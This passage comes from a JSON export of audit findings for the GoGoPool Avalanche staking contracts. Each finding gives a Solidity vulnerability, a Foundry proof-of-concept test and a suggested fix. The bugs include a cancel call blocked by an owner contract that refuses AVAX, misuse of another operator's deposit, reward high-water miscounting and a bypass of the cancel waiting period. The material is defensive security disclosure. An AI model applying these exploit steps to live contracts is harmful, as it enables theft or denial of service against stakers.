Risk)", "primary issue", "selected for report", "sponsor confirmed", "fix security (sponsor)", "M-07"], "target": "2022-12-gogopool-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L664   # Vulnerability details  ## Impact A malicious node operator may create a minipool that cannot be cancelled.  ## Proof of Concept Rialto may cancel a minipool by calling [cancelMinipoolByMultisig](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L520), however the function sends AVAX to the minipool owner, and the owner may block receiving of AVAX, causing the call to `cancelMinipoolByMultisig` to fail ([MinipoolManager.sol#L664](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L664)): ```solidity function _cancelMinipoolAndReturnFunds(address nodeID, int256 index) private {   ...   address owner = getAddress(keccak256(abi.encodePacked(\"minipool.item\", index, \".owner\")));   ...   owner.safeTransferETH(avaxNodeOpAmt); } ```  The following PoC demonstrates how calls to `cancelMinipoolByMultisig` can be blocked: ```solidity function testCancelMinipoolByMultisigDOS_AUDIT() public {   uint256 duration = 2 weeks;   uint256 depositAmt = 1000 ether;   uint256 avaxAssignmentRequest = 1000 ether;   uint128 ggpStakeAmt = 200 ether;    // Node operator is a contract than cannot receive AVAX:   // contract NodeOpContract {}   NodeOpContract nodeOpContract = new NodeOpContract();   dealGGP(address(nodeOpContract), ggpStakeAmt);   vm.deal(address(nodeOpContract), depositAmt);    vm.startPrank(address(nodeOpContract));   ggp.approve(address(staking), MAX_AMT);   staking.stakeGGP(ggpStakeAmt);   MinipoolManager.Minipool memory mp1 = createMinipool(depositAmt, avaxAssignmentRequest, duration);   vm.stopPrank();    bytes32 errorCode = \"INVALID_NODEID\";   int256 minipoolIndex = minipoolMgr.getIndexOf(mp1.nodeID);   store.setUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".status\")), uint256(MinipoolStatus.Prelaunch));    // Rialto trices to cancel the minipool created by the node operator contract but the transaction reverts since   // the node operator contract cannot receive AVAX.   vm.prank(address(rialto));   // FAIL: reverted with ETH_TRANSFER_FAILED   minipoolMgr.cancelMinipoolByMultisig(mp1.nodeID, errorCode); } ```  ## Tools Used Manual review ## Recommended Mitigation Steps Consider using the [Pull over Push pattern](https://fravoll.github.io/solidity-patterns/pull_over_push.html) to return AVAX to owners of minipools that are canceled by Rialto."}, {"title": "State Transition: Minipools can be created using other operator's AVAX deposit via recreateMinipool", "html_url": "https://github.com/code-423n4/2022-12-gogopool-findings/issues/569", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "primary issue", "selected for report", "sponsor confirmed", "fix security (sponsor)", "M-09"], "target": "2022-12-gogopool-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L444   # Vulnerability details  ## Impact  Minipools can be created using other operator's AVAX deposit via recreateMinipool  ## Proof of Concept  This issue is related to state transition of Minipools. According to the implementation, the possible states and transitions are as below.  ![Imgur](https://imgur.com/ASL235O.jpg)  The Rialto may call `recreateMinipool` when the minipool is in states of `Withdrawable, Finished, Error, Canceled`. The problem is that these four states are not the same in the sense of holding the node operator's AVAX. If the state flow has followed `Prelaunch->Launched->Staking->Error`, all the AVAX are still in the vault. If the state flow has followed `Prelaunch->Launched->Staking->Error->Finished` (last transition by `withdrawMinipoolFunds`), all the AVAX are sent back to the node operator. So if the Rialto calls `recreateMinipool` for the second case, there are no AVAX deposited from the node operator at that point but there can be AVAX from other mini pools in the state of Prelaunch. Because there are AVAX in the vault (and these are not managed per staker base), `recreatePool` results in a new mini pool in `Prelaunch` state and it is further possible to go through the normal flow `Prelaunch->Launched->Staking->Withdrawable->Finished`. And the other minipool that was waiting for launch will not be able to launch because the vault is lack of AVAX.  Below is a test case written to show an example.  ```solidity function testAudit() public {   uint256 duration = 2 weeks;   uint256 depositAmt = 1000 ether;   uint256 avaxAssignmentRequest = 1000 ether;   uint256 validationAmt = depositAmt + avaxAssignmentRequest;   uint128 ggpStakeAmt = 200 ether;    // Node Op 1   vm.startPrank(nodeOp);   ggp.approve(address(staking), MAX_AMT);   staking.stakeGGP(ggpStakeAmt);   MinipoolManager.Minipool memory mp1 = createMinipool(     depositAmt,     avaxAssignmentRequest,     duration   );   vm.stopPrank();    // Node Op 2   address nodeOp2 = getActorWithTokens(\"nodeOp2\", MAX_AMT, MAX_AMT);   vm.startPrank(nodeOp2);   ggp.approve(address(staking), MAX_AMT);   staking.stakeGGP(ggpStakeAmt);   MinipoolManager.Minipool memory mp2 = createMinipool(     depositAmt,     avaxAssignmentRequest,     duration   );   vm.stopPrank();    int256 minipoolIndex = minipoolMgr.getIndexOf(mp1.nodeID);    address liqStaker1 = getActorWithTokens(\"liqStaker1\", MAX_AMT, MAX_AMT);   vm.prank(liqStaker1);   ggAVAX.depositAVAX{ value: MAX_AMT }();    // Node Op 1: Prelaunch->Launched   vm.prank(address(rialto));   minipoolMgr.claimAndInitiateStaking(mp1.nodeID);    bytes32 txID = keccak256(\"txid\");   vm.prank(address(rialto));   // Node Op 1: Launched->Staking   minipoolMgr.recordStakingStart(mp1.nodeID, txID, block.timestamp);    vm.prank(address(rialto));   // Node Op 1: Staking->Error   bytes32 errorCode = \"INVALID_NODEID\";   minipoolMgr.recordStakingError{ value: validationAmt }(mp1.nodeID, errorCode);    // There are 2*depositAmt AVAX in the pool manager   assertEq(vault.balanceOf(\"MinipoolManager\"), depositAmt * 2);    // Node Op 1: Staking->Finished withdrawing funds   vm.prank(nodeOp);   minipoolMgr.withdrawMinipoolFunds(mp1.nodeID);   assertEq(staking.getAVAXStake(nodeOp), 0);   mp1 = minipoolMgr.getMinipool(minipoolIndex);   assertEq(mp1.status, uint256(MinipoolStatus.Finished));    // Rialto recreate a minipool for the mp1   vm.prank(address(rialto));   // Node Op 1: Finished -> Prelaunch   minipoolMgr.recreateMinipool(mp1.nodeID);    assertEq(vault.balanceOf(\"MinipoolManager\"), depositAmt);    // Node Op 1: Prelaunch -> Launched   vm.prank(address(rialto));   minipoolMgr.claimAndInitiateStaking(mp1.nodeID);    // Node Op 1: Launched -> Staking   vm.prank(address(rialto));   minipoolMgr.recordStakingStart(mp1.nodeID, txID, block.timestamp);    assertEq(staking.getAVAXStake(nodeOp), 0);   assertEq(staking.getAVAXAssigned(nodeOp), depositAmt);   assertEq(staking.getAVAXAssignedHighWater(nodeOp), depositAmt);    // now try to launch the second operator's pool, it will fail with InsufficientContractBalance   vm.prank(address(rialto));   vm.expectRevert(Vault.InsufficientContractBalance.selector);   minipoolMgr.claimAndInitiateStaking(mp2.nodeID); }  ```  ## Tools Used  Manual Review, Foundry  ## Recommended Mitigation Steps  Make sure to keep the node operator's deposit status the same for all states that can lead to the same state. For example, for all states that can transition to Prelaunch, make sure to send the AVAX back to the user and get them back on the call `recreateMiniPool()`."}, {"title": "AVAX Assigned High Water is updated incorrectly", "html_url": "https://github.com/code-423n4/2022-12-gogopool-findings/issues/566", "labels": ["bug", "3 (High Risk)", "primary issue", "selected for report", "sponsor confirmed", "fix security (sponsor)", "H-01"], "target": "2022-12-gogopool-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L374   # Vulnerability details  ## Impact  Node operators can manipulate the assigned high water to be higher than the actual.  ## Proof of Concept  The protocol rewards node operators according to the `AVAXAssignedHighWater` that is the maximum amount assigned to the specific staker during the reward cycle. In the function `MinipoolManager.recordStakingStart()`, the `AVAXAssignedHighWater` is updated as below.  ```solidity MinipoolManager.sol 349:  function recordStakingStart( 350:   address nodeID, 351:   bytes32 txID, 352:   uint256 startTime 353:  ) external { 354:   int256 minipoolIndex = onlyValidMultisig(nodeID); 355:   requireValidStateTransition(minipoolIndex, MinipoolStatus.Staking); 356:   if (startTime > block.timestamp) { 357:    revert InvalidStartTime(); 358:   } 359: 360:   setUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".status\")), uint256(MinipoolStatus.Staking)); 361:   setBytes32(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".txID\")), txID); 362:   setUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".startTime\")), startTime); 363: 364:   // If this is the first of many cycles, set the initialStartTime 365:   uint256 initialStartTime = getUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".initialStartTime\"))); 366:   if (initialStartTime == 0) { 367:    setUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".initialStartTime\")), startTime); 368:   } 369: 370:   address owner = getAddress(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".owner\"))); 371:   uint256 avaxLiquidStakerAmt = getUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".avaxLiquidStakerAmt\"))); 372:   Staking staking = Staking(getContractAddress(\"Staking\")); 373:   if (staking.getAVAXAssignedHighWater(owner) < staking.getAVAXAssigned(owner)) { 374:    staking.increaseAVAXAssignedHighWater(owner, avaxLiquidStakerAmt);//@audit wrong 375:   } 376: 377:   emit MinipoolStatusChanged(nodeID, MinipoolStatus.Staking); 378:  } ```  In the line #373, if the current assigned AVAX is greater than the owner's `AVAXAssignedHighWater`, it is increased by `avaxLiquidStakerAmt`. But this is supposed to be updated to `staking.getAVAXAssigned(owner)` rather than being increased by the amount.  Example: The node operator creates a minipool with 1000AVAX via `createMinipool(nodeID, 2 weeks, delegationFee, 1000*1e18)`. On creation, the assigned AVAX for the operator will be 1000AVAX. If the Rialtor calls `recordStakingStart()`, `AVAXAssignedHighWater` will be updated to 1000AVAX. After the validation finishes, the operator creates another minipool with 1500AVAX this time. Then on `recordStakingStart()`, `AVAXAssignedHighWater` will be updated to 2500AVAX by increasing 1500AVAX because the current assigned AVAX is 1500AVAX which is higher than the current `AVAXAssignedHighWater=1000AVAX`. This is wrong because the actual highest assigned amount is 1500AVAX. Note that `AVAXAssignedHighWater` is reset only through the function `calculateAndDistributeRewards` which can be called after `RewardsCycleSeconds=28 days`.  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Call `staking.resetAVAXAssignedHighWater(owner)` instead of calling `increaseAVAXAssignedHighWater()`.  ```solidity MinipoolManager.sol 373:   if (staking.getAVAXAssignedHighWater(owner) < staking.getAVAXAssigned(owner)) { 374:    staking.resetAVAXAssignedHighWater(owner); //@audit update to the current AVAX assigned 375:   } ```"}, {"title": "MultisigManager may not be able to add a valid Multisig", "html_url": "https://github.com/code-423n4/2022-12-gogopool-findings/issues/521", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "fix security (sponsor)", "M-11"], "target": "2022-12-gogopool-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MultisigManager.sol#L41-L43   # Vulnerability details  ## Impact When more than 10 mulitsig, it is impossible to modify or delete the old ones, making it impossible to create new valid ones.  ## Proof of Concept  MultisigManager limits the number of Multisig to 10, which cannot be deleted or replaced after they have been disable This will have a problem, if the subsequent use of 10, all 10 for some reason, be disabled Then it is impossible to add new ones and replace the old ones, so you have to continue using the old Multisig at risk  ```solidity     function registerMultisig(address addr) external onlyGuardian {         int256 multisigIndex = getIndexOf(addr);         if (multisigIndex != -1) {             revert MultisigAlreadyRegistered();         }         uint256 index = getUint(keccak256(\"multisig.count\"));         if (index >= MULTISIG_LIMIT) {             revert MultisigLimitReached(); //***@audit limt 10, and no other way to delete or replace the old Multisig ***//         } ```  ## Tools Used  ## Recommended Mitigation Steps  add replace old mulitsig method  ```solidity     function replaceMultisig(address addr,address oldAddr) external onlyGuardian {         int256 multisigIndex = getIndexOf(oldAddr);         if (multisigIndex == -1) {             revert MultisigNotFound();         }          setAddress(keccak256(abi.encodePacked(\"multisig.item\", multisigIndex, \".address\")), addr);         emit RegisteredMultisig(addr, msg.sender);     } ```"}, {"title": "Cancellation of minipool may skip MinipoolCancelMoratoriumSeconds checking if it was cancelled before", "html_url": "https://github.com/code-423n4/2022-12-gogopool-findings/issues/519", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "edited-by-warden", "fix security (sponsor)", "M-12"], "target": "2022-12-gogopool-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-gogopool/blob/main/contracts/contract/MinipoolManager.sol#L225-L227 https://github.com/code-423n4/2022-12-gogopool/blob/main/contracts/contract/MinipoolManager.sol#L279-L281   # Vulnerability details  ## Impact  When canceling a minipool that was canceled before, it may skip MinipoolCancelMoratoriumSeconds checking and allow the user to cancel the minipool immediately.  ## Proof of Concept A user may create a minipool.  ``` /// @notice Accept AVAX deposit from node operator to create a Minipool. Node Operator must be staking GGP. Open to public.  /// @param nodeID 20-byte Avalanche node ID  /// @param duration Requested validation period in seconds  /// @param delegationFee Percentage delegation fee in units of ether (2% is 0.2 ether)  /// @param avaxAssignmentRequest Amount of requested AVAX to be matched for this Minipool  function createMinipool(   address nodeID,   uint256 duration,   uint256 delegationFee,   uint256 avaxAssignmentRequest  ) external payable whenNotPaused {   if (nodeID == address(0)) {    revert InvalidNodeID();   }    ProtocolDAO dao = ProtocolDAO(getContractAddress(\"ProtocolDAO\"));   if (    // Current rule is matched funds must be 1:1 nodeOp:LiqStaker    msg.value != avaxAssignmentRequest ||    avaxAssignmentRequest > dao.getMinipoolMaxAVAXAssignment() ||    avaxAssignmentRequest < dao.getMinipoolMinAVAXAssignment()   ) {    revert InvalidAVAXAssignmentRequest();   }    if (msg.value + avaxAssignmentRequest < dao.getMinipoolMinAVAXStakingAmt()) {    revert InsufficientAVAXForMinipoolCreation();   }    Staking staking = Staking(getContractAddress(\"Staking\"));   staking.increaseMinipoolCount(msg.sender);   staking.increaseAVAXStake(msg.sender, msg.value);   staking.increaseAVAXAssigned(msg.sender, avaxAssignmentRequest);    if (staking.getRewardsStartTime(msg.sender) == 0) {    staking.setRewardsStartTime(msg.sender, block.timestamp);   }    uint256 ratio = staking.getCollateralizationRatio(msg.sender);   if (ratio < dao.getMinCollateralizationRatio()) {    revert InsufficientGGPCollateralization();   }    // Get a Rialto multisig to assign for this minipool   MultisigManager multisigManager = MultisigManager(getContractAddress(\"MultisigManager\"));   address multisig = multisigManager.requireNextActiveMultisig();    // Create or update a minipool record for nodeID   // If nodeID exists, only allow overwriting if node is finished or canceled   //   (completed its validation period and all rewards paid and processing is complete)   int256 minipoolIndex = getIndexOf(nodeID);   if (minipoolIndex != -1) {    onlyOwner(minipoolIndex);    requireValidStateTransition(minipoolIndex, MinipoolStatus.Prelaunch);    resetMinipoolData(minipoolIndex);    // Also reset initialStartTime as we are starting a whole new validation    setUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".initialStartTime\")), 0);    } else {    minipoolIndex = int256(getUint(keccak256(\"minipool.count\")));    // The minipoolIndex is stored 1 greater than actual value. The 1 is subtracted in getIndexOf()    setUint(keccak256(abi.encodePacked(\"minipool.index\", nodeID)), uint256(minipoolIndex + 1));    setAddress(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".nodeID\")), nodeID);    addUint(keccak256(\"minipool.count\"), 1);   }    // Save the attrs individually in the k/v store   setUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".status\")), uint256(MinipoolStatus.Prelaunch));   setUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".duration\")), duration);   setUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".delegationFee\")), delegationFee);    setAddress(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".owner\")), msg.sender);   setAddress(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".multisigAddr\")), multisig);   setUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".avaxNodeOpInitialAmt\")), msg.value);   setUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".avaxNodeOpAmt\")), msg.value);   setUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".avaxLiquidStakerAmt\")), avaxAssignmentRequest);    emit MinipoolStatusChanged(nodeID, MinipoolStatus.Prelaunch);    Vault vault = Vault(getContractAddress(\"Vault\"));   vault.depositAVAX{value: msg.value}();  } ```  and after 5 days, the user cancels the minipool  ```  /// @notice Owner of a minipool can cancel the (prelaunch) minipool  /// @param nodeID 20-byte Avalanche node ID the Owner registered with  function cancelMinipool(address nodeID) external nonReentrant {   Staking staking = Staking(getContractAddress(\"Staking\"));   ProtocolDAO dao = ProtocolDAO(getContractAddress(\"ProtocolDAO\"));   int256 index = requireValidMinipool(nodeID);   onlyOwner(index);   // make sure they meet the wait period requirement   if (block.timestamp - staking.getRewardsStartTime(msg.sender) < dao.getMinipoolCancelMoratoriumSeconds()) {    revert CancellationTooEarly();   }   _cancelMinipoolAndReturnFunds(nodeID, index);  } ```  Then, the user recreates the minipool again by calling the same createMinipool function. Then, the user cancels the minipool immediately. The user should not be allowed to cancel the minpool immediately and he should wait for 5 more days.  Added a test unit to MinipoolManager.t.sol  ```  function testMinipoolManager() public {   address nodeID1 = randAddress();    vm.startPrank(nodeOp);   ggp.approve(address(staking), MAX_AMT);   staking.stakeGGP(100 ether);    {    MinipoolManager.Minipool memory mp = createMyMinipool(nodeID1, 1000 ether, 1000 ether, 2 weeks);     skip(5 days);    minipoolMgr.cancelMinipool(mp.nodeID); // Must skip 5 days to be executed   }    {    MinipoolManager.Minipool memory mp = createMyMinipool(nodeID1, 1000 ether, 1000 ether, 2 weeks);    minipoolMgr.cancelMinipool(mp.nodeID); // Do not need 5 days more to be executed which is wrong   }    vm.stopPrank();  } ```  ## Tools Used Manual and added a test unit  ## Recommended Mitigation Steps Change the createMinipool function. Always setRewardsStartTime everytime the minippol is recreated.   ``` /// @notice Accept AVAX deposit from node operator to create a Minipool. Node Operator must be staking GGP. Open to public.  /// @param nodeID 20-byte Avalanche node ID  /// @param duration Requested validation period in seconds  /// @param delegationFee Percentage delegation fee in units of ether (2% is 0.2 ether)  /// @param avaxAssignmentRequest Amount of requested AVAX to be matched for this Minipool  function createMinipool(   address nodeID,   uint256 duration,   uint256 delegationFee,   uint256 avaxAssignmentRequest  ) external payable whenNotPaused {   if (nodeID == address(0)) {    revert InvalidNodeID();   }    ProtocolDAO dao = ProtocolDAO(getContractAddress(\"ProtocolDAO\"));   if (    // Current rule is matched funds must be 1:1 nodeOp:LiqStaker    msg.value != avaxAssignmentRequest ||    avaxAssignmentRequest > dao.getMinipoolMaxAVAXAssignment() ||    avaxAssignmentRequest < dao.getMinipoolMinAVAXAssignment()   ) {    revert InvalidAVAXAssignmentRequest();   }    if (msg.value + avaxAssignmentRequest < dao.getMinipoolMinAVAXStakingAmt()) {    revert InsufficientAVAXForMinipoolCreation();   }    Staking staking = Staking(getContractAddress(\"Staking\"));   staking.increaseMinipoolCount(msg.sender);   staking.increaseAVAXStake(msg.sender, msg.value);   staking.increaseAVAXAssigned(msg.sender, avaxAssignmentRequest);    --- if (staking.getRewardsStartTime(msg.sender) == 0) {    staking.setRewardsStartTime(msg.sender, block.timestamp);   --- }    uint256 ratio = staking.getCollateralizationRatio(msg.sender);   if (ratio < dao.getMinCollateralizationRatio()) {    revert InsufficientGGPCollateralization();   }    // Get a Rialto multisig to assign for this minipool   MultisigManager multisigManager = MultisigManager(getContractAddress(\"MultisigManager\"));   address multisig = multisigManager.requireNextActiveMultisig();    // Create or update a minipool record for nodeID   // If nodeID exists, only allow overwriting if node is finished or canceled   //   (completed its validation period and all rewards paid and processing is complete)   int256 minipoolIndex = getIndexOf(nodeID);   if (minipoolIndex != -1) {    requireValidStateTransition(minipoolIndex, MinipoolStatus.Prelaunch);    resetMinipoolData(minipoolIndex);    // Also reset initialStartTime as we are starting a whole new validation    setUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".initialStartTime\")), 0);   } else {    minipoolIndex = int256(getUint(keccak256(\"minipool.count\")));    // The minipoolIndex is stored 1 greater than actual value. The 1 is subtracted in getIndexOf()    setUint(keccak256(abi.encodePacked(\"minipool.index\", nodeID)), uint256(minipoolIndex + 1));    setAddress(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".nodeID\")), nodeID);    addUint(keccak256(\"minipool.count\"), 1);   }    // Save the attrs individually in the k/v store   setUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".status\")), uint256(MinipoolStatus.Prelaunch));   setUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".duration\")), duration);   setUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".delegationFee\")), delegationFee);   setAddress(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".owner\")), msg.sender);   setAddress(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".multisigAddr\")), multisig);   setUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".avaxNodeOpInitialAmt\")), msg.value);   setUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".avaxNodeOpAmt\")), msg.value);   setUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".avaxLiquidStakerAmt\")), avaxAssignmentRequest);    emit MinipoolStatusChanged(nodeID, MinipoolStatus.Prelaunch);    Vault vault = Vault(getContractAddress(\"Vault\"));   vault.depositAVAX{value: msg.value}();  } ```"}, {"title": "node operator is getting slashed for full duration even though rewards are distributed based on a 14 day cycle", "html_url": "https://github.com/code-423n4/2022-12-gogopool-findings/issues/493", "labels": ["bug", "3 (High Risk)", "primary issue", "selected for report", "sponsor confirmed", "upgraded by judge", "fix security (sponsor)", "H-03"], "target": "2022-12-gogopool-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-gogopool/blob/main/contracts/contract/MinipoolManager.sol#L673-L675   # Vulnerability details  ## Description A node operator sends in the amount of duration they want to stake for. Behind the scenes Rialto will stake in 14 day cycles and then distribute rewards.  If a node operator doesn't have high enough availability and doesn't get any rewards, the protocol will slash their staked `GGP`. For calculating the expected rewards that are missed however, the full duration is used:  ```javascript File: MinipoolManager.sol  557: function getExpectedAVAXRewardsAmt(uint256 duration, uint256 avaxAmt) public view returns (uint256) { 558:  ProtocolDAO dao = ProtocolDAO(getContractAddress(\"ProtocolDAO\")); 559:  uint256 rate = dao.getExpectedAVAXRewardsRate(); 560:  return (avaxAmt.mulWadDown(rate) * duration) / 365 days; // full duration used when calculating expected reward 561: }  ...  670: function slash(int256 index) private {  ...  673:  uint256 duration = getUint(keccak256(abi.encodePacked(\"minipool.item\", index, \".duration\"))); 674:  uint256 avaxLiquidStakerAmt = getUint(keccak256(abi.encodePacked(\"minipool.item\", index, \".avaxLiquidStakerAmt\"))); 675:  uint256 expectedAVAXRewardsAmt = getExpectedAVAXRewardsAmt(duration, avaxLiquidStakerAmt); // full duration 676:  uint256 slashGGPAmt = calculateGGPSlashAmt(expectedAVAXRewardsAmt); ```  This is unfair to the node operator because the expected rewards is from a 14 day cycle.  Also, If they were to be unavailable again, in a later cycle, they would get slashed for the full duration once again.  ## Impact A node operator staking for a long time is getting slashed for an unfairly large amount if they aren't available during a 14 day period.  The protocol also wants node operators to stake in longer periods: https://multisiglabs.notion.site/Known-Issues-42e2f733daf24893a93ad31100f4cd98 > Team Comment:   > - This can only be taken advantage of when signing up for 2-4 week validation periods. **Our protocol is incentivizing nodes to sign up for 3-12 month validation periods.** If the team notices this mechanic being abused, Rialto may update its GGP reward calculation to disincentive this behavior.  This slashing amount calculation incentives the node operator to sign up for the shortest period possible and restake themselves to minimize possible losses.   ## Proof of Concept Test in `MinipoolManager.t.sol`:  ```javascript  function testRecordStakingEndWithSlashHighDuration() public {   uint256 duration = 365 days;   uint256 depositAmt = 1000 ether;   uint256 avaxAssignmentRequest = 1000 ether;   uint256 validationAmt = depositAmt + avaxAssignmentRequest;   uint128 ggpStakeAmt = 200 ether;    vm.startPrank(nodeOp);   ggp.approve(address(staking), MAX_AMT);   staking.stakeGGP(ggpStakeAmt);   MinipoolManager.Minipool memory mp1 = createMinipool(depositAmt, avaxAssignmentRequest, duration);   vm.stopPrank();    address liqStaker1 = getActorWithTokens(\"liqStaker1\", MAX_AMT, MAX_AMT);   vm.prank(liqStaker1);   ggAVAX.depositAVAX{value: MAX_AMT}();    vm.prank(address(rialto));   minipoolMgr.claimAndInitiateStaking(mp1.nodeID);    bytes32 txID = keccak256(\"txid\");   vm.prank(address(rialto));   minipoolMgr.recordStakingStart(mp1.nodeID, txID, block.timestamp);    skip(2 weeks); // a two week cycle      vm.prank(address(rialto));   minipoolMgr.recordStakingEnd{value: validationAmt}(mp1.nodeID, block.timestamp, 0 ether);    assertEq(vault.balanceOf(\"MinipoolManager\"), depositAmt);    int256 minipoolIndex = minipoolMgr.getIndexOf(mp1.nodeID);   MinipoolManager.Minipool memory mp1Updated = minipoolMgr.getMinipool(minipoolIndex);   assertEq(mp1Updated.status, uint256(MinipoolStatus.Withdrawable));   assertEq(mp1Updated.avaxTotalRewardAmt, 0);   assertTrue(mp1Updated.endTime != 0);    assertEq(mp1Updated.avaxNodeOpRewardAmt, 0);   assertEq(mp1Updated.avaxLiquidStakerRewardAmt, 0);    assertEq(minipoolMgr.getTotalAVAXLiquidStakerAmt(), 0);    assertEq(staking.getAVAXAssigned(mp1Updated.owner), 0);   assertEq(staking.getMinipoolCount(mp1Updated.owner), 0);    // log slash amount   console.log(\"slashedAmount\",mp1Updated.ggpSlashAmt);  } ```  Slashed amount for a `365 days` duration is `100 eth` (10%). However, where they to stake for the minimum time, `14 days` the slashed amount would be only ~`3.8 eth`.  ## Tools Used vs code, forge  ## Recommended Mitigation Steps Either hard code the duration to 14 days for calculating expected rewards or calculate the actual duration using `startTime` and `endTime`. "}, {"title": "maxWithdraw() and maxRedeem() doesn't return correct value which can make other contracts fail while working with protocol", "html_url": "https://github.com/code-423n4/2022-12-gogopool-findings/issues/476", "labels": ["bug", "2 (Med Risk)", "selected for report", "sponsor confirmed", "fix token (sponsor)", "M-16"], "target": "2022-12-gogopool-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L215-L223 https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L205-L213   # Vulnerability details  ## Impact Functions `maxWithdraw()` and `maxRedeem()` returns max amount of assets or shares owner would be able to withdraw taking into account liquidity in the TokenggAVAX contract, but logics don't consider that when user withdraws the withdrawal amounts subtracted from `totalReleasedAssets` (in `beforeWithdraw()` function) so the maximum amounts that can user withdraws should always be lower than `totalReleasedAssets` (which shows all the deposits and withdraws) but because functions `maxWithdraw()` and `maxRedeem()` uses `totalAssets()` to calculate available AVAX which includes deposits and current cycle rewards so those functions would return wrong value (whenever the return value is bigger than `totalReleaseAssets` then it would be wrong)  ## Proof of Concept This is `beforeWithdraw()` code: ```  function beforeWithdraw(   uint256 amount,   uint256 /* shares */  ) internal override {   totalReleasedAssets -= amount;  } ``` This is `beforeWithdraw()` code which is called whenever users withdraws their funds and as you can see the amount of withdrawal assets subtracted from `totalReleaseAssets` so withdrawal amounts can never be bigger than `totalReleaseAssets`. This is `maxWithdraw()` code: ```  function maxWithdraw(address _owner) public view override returns (uint256) {   if (getBool(keccak256(abi.encodePacked(\"contract.paused\", \"TokenggAVAX\")))) {    return 0;   }   uint256 assets = convertToAssets(balanceOf[_owner]);   uint256 avail = totalAssets() - stakingTotalAssets;   return assets > avail ? avail : assets;  } ``` As you can see to calculate available AVAX in the contract address code uses `totalAssets() - stakingTotalAssets` and `totalAssets()` shows deposits + current cycle rewards so `totalAssets()` is bigger than `totalReleaseAssets` and the value of the `totalAssets() - stakingTotalAssets` can be bigger than `totalReleaseAssets` and if code returns `avail` as answer then the return value would be wrong. imagine this scenario: 1. `totalReleaseAssets` is `10000` AVAX. 2. `stakingTotalAssets` is `1000` AVAX. 3. current cycle rewards is `4000` AVAX and `block.timestamp` is currently in the middle of the cycle so current rewards is `2000` AVAX. 4. `totalAssets()` is `totalReleaseAssets + current rewards = 10000 + 2000 = 12000`.  5. contract balance is `10000 + 4000 - 1000 = 13000` AVAX. 6. user1 has 90% contract shares and calls `maxWithdraw()` and code would calculate user assets as `10800` AVAX and available AVAX in contract as `totalAssets() - stakingTotalAssets = 12000 - 1000 = 11000` and code would return `10800` as answer. 7. now if user1 withdraws `10800` AVAX code would revert in the function `beforeWithdraw()` because code would try to execute `totalReleaseAssets = totalReleaseAssets - amount = 10000 - 10800` and it would revert because of the underflow. so in reality user1 couldn't withdraw `10800` AVAX which was the return value of the `maxWithdraw()` for user1.  the root cause of the bug is that the withdrawal amount is subtracted from `totalReleaseAssets` and so max withdrawal can never be `totalReleaseAssets` and function `maxWithdraw()` should never return value bigger than `totalReleaseAssets`. (the bug in function `maxRedeem()` is similar)  This bug would cause other contract or front end calls to fail, for example if the logic is something like this: ```    amount = maxWithdraw(user);    TokenggAVAX.withdrawAVAX(amount); ``` according the function definitions this code should work bug because of the the issue there are situations that this would revert and other contracts and UI can't work properly with the protocol.  ## Tools Used VIM  ## Recommended Mitigation Steps consider `totalReleaseAssets` in max withdrawal amount too."}, {"title": "MinipoolManager: recordStakingError function does not decrease minipoolCount leading to too high GGP rewards for staker", "html_url": "https://github.com/code-423n4/2022-12-gogopool-findings/issues/235", "labels": 